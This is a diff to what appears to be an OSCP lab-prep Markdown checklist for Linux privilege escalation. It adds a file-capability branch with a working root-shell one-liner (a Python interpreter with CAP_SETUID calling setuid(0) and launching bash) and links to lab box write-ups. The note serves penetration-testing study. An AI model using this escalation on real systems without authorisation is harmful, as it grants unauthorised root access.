@@ -60,6 +60,7 @@ Focus on the current identity first, then the relationship between a privileged 
 ## What did you get?
 
 - [ ] Sudo rights are found → **Go to Step 14 · [[Linux - Sudo Check]]**
+- [ ] A file capability is present → **Go to Step 13B · [[Linux - File Capabilities]]**
 - [ ] SUID files are found → **Go to Step 15 · [[Linux - SUID Check]]**
 - [ ] Root cron jobs or writable scripts are found → **Go to Step 16 · [[Linux - Cron Check]]**
 - [ ] A writable service is found → **Run `systemctl cat $ServiceName` and `ls -la $ServicePath`, then go to Step 10 · [[Linux - Exploit Search]] if the service file or binary is writable**
@@ -186,6 +187,20 @@ id
 
 - [ ] A root-owned, readable tmux socket is found -> **Attach to the existing session, confirm identity, then collect the root proof**
 
+## File-capability escalation
+
+When the manual capability scan returns a versioned interpreter or other binary with CAP_SETUID, confirm the exact path and use it for a controlled identity proof. This branch can succeed even when sudo and SUID enumeration produce no useful route.
+
+~~~bash
+getcap -r / 2>/dev/null
+getcap /usr/bin/python3.8
+/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+id
+whoami
+~~~
+
+CAP_SETUID changes the process UID; the group ID may remain unchanged. Record the complete id output and route to [[Linux - File Capabilities]] for failure handling and cleanup.
+
 ## Seen in
 
 - [[OSCP/BOXES/WRITE UPS/Linux/Blocky|Blocky]] -- identity and group enumeration showed both lxd and unrestricted sudo; the direct sudo path was prioritised
@@ -207,6 +222,8 @@ id
 - [[OSCP/BOXES/WRITE UPS/Linux/Knife|Knife]] -- identity, OS, Knife version, and passwordless sudo checks selected the embedded-code escalation path
 - [[OSCP/BOXES/WRITE UPS/Linux/DevOops|DevOops]] -- identity and sudo checks led to a user-owned Git repository and historical credential review
 - [[OSCP/BOXES/WRITE UPS/Linux/Mirai|Mirai]] -- identity, Raspberry Pi OS, group membership, and mounted USB metadata selected the direct sudo path and a safe forensic branch
+- [[OSCP/BOXES/WRITE UPS/Linux/Management|Management]] -- service-account identity, SUID/capability/process checks, and application-directory review selected the GLPI credential pivot over generic local exploits
+- [[OSCP/BOXES/WRITE UPS/Linux/Cap|Cap]] -- sudo and SUID checks were not the route; getcap identified a versioned Python interpreter with CAP_SETUID
 
 ## Git repository after foothold
 
